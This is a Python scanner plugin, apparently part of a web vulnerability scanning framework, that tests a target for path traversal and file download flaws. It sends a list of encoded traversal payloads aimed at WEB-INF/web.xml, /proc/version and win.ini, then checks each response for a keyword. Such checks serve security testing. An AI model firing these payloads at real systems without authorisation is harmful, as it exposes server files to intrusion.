#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.file_download_payload_map = {
            './WEB-INF/web.xml': '<web-app',
            '.%00/WEB-INF/web.xml': '<web-app',
            '%57%45B-INF/web.xml': '<web-app',
            '%u002e/WEB-INF/web.xml': '<web-app',
            '/proc/version': 'Linux version',
            '/Windows/win.ini': '[extensions]',
            '..2f.2f..2f..2f..2f..2f..2f.2f..2f..2f..2f.2f..2f./WEB-INF/web.xml': '<web-app',
            '..2f.2f..2f..2f..2f..2f..2f.2f..2f..2f..2f.2f..2f./proc/version': 'Linux version',
            '..2f.2f..2f..2f..2f..2f..2f.2f..2f..2f..2f.2f..2f./Windows/win.ini': '[extensions]',
            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../proc/version': 'Linux version',
            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../Windows/win.ini': '[extensions]',
        }

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if "?" not in path:
                        for file_path, keyword in self.file_download_payload_map.items():
                            url = path + file_path
                            try:
                                async with session.get(url) as res:
                                    if res:
                                        text = await res.text()
                                        if text:
                                            if keyword in text:
                                                yield url
                                                return
                            except:
                                pass
